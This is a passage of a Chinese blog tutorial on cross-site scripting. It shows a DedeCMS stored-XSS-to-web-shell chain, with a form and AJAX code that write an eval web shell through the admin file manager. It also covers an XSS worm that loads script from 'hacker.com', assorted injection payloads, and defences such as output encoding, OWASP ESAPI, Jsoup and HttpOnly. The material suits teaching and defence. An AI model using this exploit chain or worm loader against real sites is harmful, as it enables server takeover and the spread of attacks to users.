+<h4 id="示例："><a href="#示例：" class="headerlink" title="示例："></a>示例：</h4><p>DedeCMSV57_GBK_SP1版本feedback_ajax.php与feedback.php都存在同样的xss跨站漏洞</p>
+<ul>
+<li>在前台页面提交数据到feedback_ajax.php，拦截HTTP请求<img src="/2021/12/17/xss%E6%BC%8F%E6%B4%9E/1-5.png" class="">
+<img src="/2021/12/17/xss%E6%BC%8F%E6%B4%9E/2-3.png" class="">
+在请求中可以看到有很多隐藏的参数，如dopost,aid,fid,face等，但此处的参数项都做了过滤，不存在xss,但通过代码审计<img src="/2021/12/17/xss%E6%BC%8F%E6%B4%9E/3-2.png" class="">
+<img src="/2021/12/17/xss%E6%BC%8F%E6%B4%9E/4-2.png" class="">
+<img src="/2021/12/17/xss%E6%BC%8F%E6%B4%9E/5-3.png" class="">
+我们发现在评论提交时，表单中没有title字段，但在PHP程序中却冒出来一个$title变量，并使用addslashes()对$title变量过滤后赋值给变量$arctitle,最后把$arctitle的值存入了数据库。但是addslashes()的作用是对预定义字符进行转义（在预定义字符前添加“\”,预定义字符有’(单引号），”(双引号), \(反斜杠), NULL(空字符)），addslashes()经常用来过滤SQL注入，但对xss来说没有任何作用<br>因此我们可以拦截数据包，在数据包中加入title参数，参数值为xss代码<img src="/2021/12/17/xss%E6%BC%8F%E6%B4%9E/6-2.png" class="">
+就这样，xss代码就被存入了数据库，形成了存储型XSS漏洞<br>存入的xss代码会在访问管理页面，浏览评论管理页面时输出<img src="/2021/12/17/xss%E6%BC%8F%E6%B4%9E/7-2.png" class="">
+由于DedeCMS是一个非常强大的网站内容管理系统，它有一个模块可以进行在线文件管理，如：新建、编辑、删除文件，因此我们可以利用它的这个功能来获取webshell<br>对新建文件功能进行抓包，HTTP请求为<img src="/2021/12/17/xss%E6%BC%8F%E6%B4%9E/8-1.png" class="">
+如果以管理员的身份来提交这段HTTP请求，就会向服务器写入shell文件<br>攻击者使用两种手段静悄悄的发起这段HTTP请求<ul>
+<li><p>form表单自动提交<br>  构造HTML自动提交表单  </p>
+  <pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>form<span class="token punctuation">"</span></span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/dede/file_manage_control.php<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>POST<span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>iframe<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>fmdo<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>edit<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>backurl<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>filename<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>xss.php<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>str<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>&lt;?php @eval($_POST['chopper']);?><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>					
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>  <code>这段表单可以自动提交POST请求，但并不适用于此时的这种环境，因为这段HTML文本太长，虽然可以用&lt;iframe&gt;等标签缩短，但却不如ajax适用</code></p>
+</li>
+<li><p>AJAX发送post请求</p>
+  <pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> xmlhttp<span class="token punctuation">;</span> 
+<span class="token keyword">function</span> <span class="token function">createXMLHTTP</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span>window<span class="token punctuation">.</span>XMLHttpRequest<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        xmlhttp<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
+    <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>window<span class="token punctuation">.</span>ActiveXObject<span class="token punctuation">)</span><span class="token punctuation">&#123;</span> 
+        xmlhttp<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">ActiveXObject</span><span class="token punctuation">(</span><span class="token string">"Microsoft.XMLHTTP"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span> 
+<span class="token keyword">function</span> <span class="token function">startXMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> 
+    <span class="token function">createXMLHTTP</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
+    <span class="token keyword">var</span> str<span class="token operator">=</span><span class="token string">"fmdo=edit&amp;backurl=&amp;activepath=/dede&amp;filename=xss.php&amp;str=&lt;?php @eval($_POST['chopper']);?>"</span><span class="token punctuation">;</span> 
+    <span class="token comment">//str=encodeURI(str); </span>
+    xmlhttp<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"POST"</span><span class="token punctuation">,</span><span class="token string">"/dede/file_manage_control.php"</span><span class="token punctuation">,</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
+    xmlhttp<span class="token punctuation">.</span><span class="token function">setRequestHeader</span><span class="token punctuation">(</span><span class="token string">"Content-type"</span><span class="token punctuation">,</span><span class="token string">"application/x-www-form-urlencoded"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
+    xmlhttp<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span> 
+<span class="token punctuation">&#125;</span> 
+<span class="token function">startXMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>  将以上的javascript代码保存至文本文件中，然后将该文本文件放置到攻击者的服务器上。攻击者就可以利用目标网站存在的存储型xss漏洞向目标网站服务器中写入一段javascript代码</p>
+</li>
+</ul>
+</li>
+</ul>
+<p>注：XSS GetShell的利用条件是苛刻的，只有开源的web应用程序才可能有XSS GetShell.在进行黑盒测试时，XSS GetShell几乎是不可能的事情</p>
+<h3 id="XSS蠕虫（XSS-Worm）"><a href="#XSS蠕虫（XSS-Worm）" class="headerlink" title="XSS蠕虫（XSS Worm）"></a>XSS蠕虫（XSS Worm）</h3><h4 id="蠕虫病毒"><a href="#蠕虫病毒" class="headerlink" title="蠕虫病毒"></a>蠕虫病毒</h4><p>具有“传染性”的恶意软件</p>
+<h4 id="XSS蠕虫"><a href="#XSS蠕虫" class="headerlink" title="XSS蠕虫"></a>XSS蠕虫</h4><p>是针对浏览器的攻击，网站规模越大，攻击效果就越大</p>
+<h4 id="XSS蠕虫与系统病毒的区别"><a href="#XSS蠕虫与系统病毒的区别" class="headerlink" title="XSS蠕虫与系统病毒的区别"></a>XSS蠕虫与系统病毒的区别</h4><p>同样具有“传染性”，与系统病毒的唯一区别就是无法对系统底层操作，因为XSS蠕虫一般是基于javascript编写，而javascript最大的用武之地是web,但对于底层编程能力几乎为零。</p>
+<h4 id="XSS蠕虫应用场景"><a href="#XSS蠕虫应用场景" class="headerlink" title="XSS蠕虫应用场景"></a>XSS蠕虫应用场景</h4><p>XSS蠕虫大多数出现在大用户量的网站平台，比如微博、贴吧等一些社交网站。因为只有当用户量足够多的情况下，XSS蠕虫才能发挥效果</p>
+<h4 id="示例：微博XSS蠕虫–-gt-让更多的用户关注自己"><a href="#示例：微博XSS蠕虫–-gt-让更多的用户关注自己" class="headerlink" title="示例：微博XSS蠕虫–&gt;让更多的用户关注自己"></a>示例：微博XSS蠕虫–&gt;让更多的用户关注自己</h4><h5 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h5><ul>
+<li>展开XSS蠕虫攻击之前，首先需要对网站的业务、功能有所了解<ul>
+<li>分析如何让他人关注自己<br>  访问 <a target="_blank" rel="noopener" href="http://www.weibo.com/listen.php?userid=888">http://www.weibo.com/listen.php?userid=888</a></li>
+<li>分析如何让蠕虫自主传播<br>  微博发表微博处存在存储型XSS漏洞，攻击者发表一篇微博，其中存在XSS攻击代码，当有用户访问了攻击者发表的微博页面，该XSS攻击代码就会在用户的浏览器上执行。该XSS攻击代码的功能是关注攻击者并转发攻击者的微博让更多人看到。</li>
+</ul>
+</li>
+<li>展开XSS蠕虫攻击<ul>
+<li>在目标网站存在存储型XSS漏洞的地方插入XSS攻击代码</li>
+<li>如果目标网站限制插入内容的长度，则可以通过导入外部js的方式来缩短内容<ul>
+<li>将xss攻击代码以xss.js文件保存到攻击者服务器上</li>
+<li>在存储型漏洞点处插入  <pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script src<span class="token operator">=</span><span class="token string">"http://hacker.com/xss.js"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="XSS蠕虫的核心"><a href="#XSS蠕虫的核心" class="headerlink" title="XSS蠕虫的核心"></a>XSS蠕虫的核心</h4><p>能够自主传播</p>
+<h2 id="修复XSS跨站漏洞"><a href="#修复XSS跨站漏洞" class="headerlink" title="修复XSS跨站漏洞"></a>修复XSS跨站漏洞</h2><h3 id="XSS漏洞的形成原因"><a href="#XSS漏洞的形成原因" class="headerlink" title="XSS漏洞的形成原因"></a>XSS漏洞的形成原因</h3><p>对输入与输出没有严格过滤，导致用户输入的javascript等客户端脚本在浏览器上执行</p>
+<h3 id="修补XSS漏洞"><a href="#修补XSS漏洞" class="headerlink" title="修补XSS漏洞"></a>修补XSS漏洞</h3><p>只要将敏感字符过滤，即可修补XSS跨站漏洞</p>
+<h4 id="XSS过滤方法"><a href="#XSS过滤方法" class="headerlink" title="XSS过滤方法"></a>XSS过滤方法</h4><h5 id="输入与输出"><a href="#输入与输出" class="headerlink" title="输入与输出"></a>输入与输出</h5><ul>
+<li>HTML的特殊字符<br>|     |     |     |     |     |     |</li>
+</ul>
+<p>| — | — | — | — | — | — |<br>| 特殊字符 | &lt;   | &gt;   | ‘   | “   | &amp;   |<br>| 实体  | &amp;lt;   | &amp;gt;   | &amp;apos;   | &amp;quot;   | &amp;amp;   | </p>
+<ul>
+<li><p>PHP函数–&gt;把预定义的字符转换为html实体<br><code>htmlspecialchars()</code><br><code>htmlentities()</code> </p>
+</li>
+<li><p>JAVA第三方组件–&gt;支持过滤XSS漏洞</p>
+<ul>
+<li>OWASP ESAPI<ul>
+<li>OWASP ESAPI工具包是专门用来防御安全漏洞的API,如：SQL注入、XSS、CSRF等知名漏洞</li>
+<li>OWASP ESAPI支持JavaEE、ASP、NET、PHP、Python等语言 </li>
+<li>XSS可能发生的场景<ul>
+<li><p>在标签内输出</p>
+  <pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span>$&#123;xss&#125;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>  在标签内输出数据则无需构造标签，直接控制${xss}变量即可造成XSS漏洞,如：</p>
+  <pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">xss</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">)</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+</li>
+<li><p>在属性内输出</p>
+  <pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>$&#123;xss&#125;<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+  <pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>username<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>$&#123;xss&#125;<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+  <pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>$&#123;xss&#125;<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>hello<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>  在属性内输出数据则仅仅需要闭合标签，就可以继续进行XSS操作，如:</p>
+  <pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>username<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token special-attr"><span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">xss</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">)</span></span><span class="token punctuation">"</span></span></span> <span class="token punctuation">/></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+  <pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>username<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">xss</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">)</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>" /><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+  <pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>javascript:alert(/xss/)<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>hello<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+</li>
+<li><p>在事件中输出（与属性相同）</p>
+  <pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>x.jpg<span class="token punctuation">"</span></span> <span class="token special-attr"><span class="token attr-name">onerror</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript">$<span class="token punctuation">&#123;</span>xss<span class="token punctuation">&#125;</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">/></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+  <pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>username<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>test<span class="token punctuation">"</span></span> <span class="token special-attr"><span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript"><span class="token function">fun</span><span class="token punctuation">(</span><span class="token string">'$&#123;xss&#125;'</span><span class="token punctuation">)</span></span><span class="token punctuation">"</span></span></span> <span class="token punctuation">/></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>  攻击的方法同样是进行闭合，如：</p>
+  <pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>username<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>test<span class="token punctuation">"</span></span> <span class="token special-attr"><span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript"><span class="token function">fun</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span></span><span class="token punctuation">"</span></span></span> <span class="token special-attr"><span class="token attr-name">onkeyup</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">xss</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//')</span></span><span class="token punctuation">"</span></span></span> <span class="token punctuation">/></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+  <pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>username<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>test<span class="token punctuation">"</span></span> <span class="token special-attr"><span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript"><span class="token function">fun</span><span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">xss</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//')</span></span><span class="token punctuation">"</span></span></span> <span class="token punctuation">/></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+</li>
+<li><p>在CSS中输出</p>
+  <pre class="line-numbers language-css" data-language="css"><code class="language-css"> 
+<span class="token selector">&lt;style>
+body</span> <span class="token punctuation">&#123;</span><span class="token property">background-image</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>$&#123;xss&#125;<span class="token punctuation">)</span></span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>
+<span class="token selector">body</span> <span class="token punctuation">&#123;</span><span class="token selector">background-image: expression($</span><span class="token punctuation">&#123;</span>xss<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>
+&lt;/style><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>  在CSS中输出同样存在XSS的风险,如：</p>
+  <pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token selector">body</span> <span class="token punctuation">&#123;</span><span class="token property">background-image</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span><span class="token string url">"javascript:alert(/xss/)"</span><span class="token punctuation">)</span></span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+  <pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token selector">body</span> <span class="token punctuation">&#123;</span><span class="token property">background-image</span><span class="token punctuation">:</span> <span class="token function">expression</span><span class="token punctuation">(</span><span class="token function">alert</span><span class="token punctuation">(</span>/xss/<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+</li>
+<li><p>在script标签中输出</p>
+  <pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">></span>
+	<span class="token keyword">var</span> username<span class="token operator">=</span><span class="token string">"$&#123;username&#125;"</span><span class="token punctuation">;</span>
+<span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p>  这里的侧重点仍然是闭合标签</p>
+  <pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> username<span class="token operator">=</span><span class="token string">"1"</span><span class="token punctuation">;</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">xss</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//";</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
+</ul>
+</li>
+<li>在OWASP ESAPI的“org.owasp.esapi.codecs”包中提供了一系列的编码操作，其中包括：HTML编码、Javascript编码、VBScript编码、CSS编码、SQL编码等。<ul>
+<li>HTML编码接口<ul>
+<li>HTML编码接口  <img src="/2021/12/17/xss%E6%BC%8F%E6%B4%9E/1-4.png" class="">
+  <img src="/2021/12/17/xss%E6%BC%8F%E6%B4%9E/2-5.png" class=""></li>
+<li>HTML属性编码接口  <img src="/2021/12/17/xss%E6%BC%8F%E6%B4%9E/3-3.png" class=""></li>
+<li>注：  <img src="/2021/12/17/xss%E6%BC%8F%E6%B4%9E/4-3.png" class=""></li>
+</ul>
+</li>
+<li>CSS编码接口<br>  对输入输出的CSS编码  <img src="/2021/12/17/xss%E6%BC%8F%E6%B4%9E/5-2.png" class="">
+  <img src="/2021/12/17/xss%E6%BC%8F%E6%B4%9E/1-2.png" class=""></li>
+<li>Javascript编码<br>  对输入输出的javascript编码  <img src="/2021/12/17/xss%E6%BC%8F%E6%B4%9E/2-2.png" class="">
+  编码结果为十六进制字符串</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>JSOUP<ul>
+<li>JAVA的HTML解析器</li>
+<li>使用白名单（Whitelist）的过滤模式过滤html标签和属性：Whitelist中含有对应的标签及属性就说明服务器允许用户输入该标签及属性，如果Whitelist中不含有对应的标签及属性就说明服务器不允许用户输入该标签及属性<ul>
+<li>使用Jsoup HTML Cleaner方法可以清除XSS漏洞，但需要指定一个可配置的Whitelist</li>
+<li>示例  <img src="/2021/12/17/xss%E6%BC%8F%E6%B4%9E/1-3.png" class="">
+  <img src="/2021/12/17/xss%E6%BC%8F%E6%B4%9E/2-4.png" class=""></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>xssprotect</li>
+</ul>
+</li>
+</ul>
+<h5 id="HttpOnly"><a href="#HttpOnly" class="headerlink" title="HttpOnly"></a>HttpOnly</h5><p>HttpOnly对防御XSS漏洞不起作用，而主要目的是为了解决攻击者利用XSS漏洞进行的cookie劫持攻击</p>
+<ul>
+<li>定义：HttpOnly是微软的IE6 sp1引入的一项新特性，这个特性为cookie提供了一个新属性，用来阻止客户端脚本访问cookie。至今已成为一个标准，几乎所有的浏览器都会支持HttpOnly。</li>
+<li>服务器向客户端发送cookie<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+	<span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Set-Cookie:username=root"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//1</span>
+	<span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Set-Cookie:password=password;HttpOnly"</span><span class="token punctuation">,</span><span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//2</span>
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+由于第2条cookie带有HttpOnly标志，所以客户端脚本就不能访问该cookie</li>
+</ul>
+
+      </div>
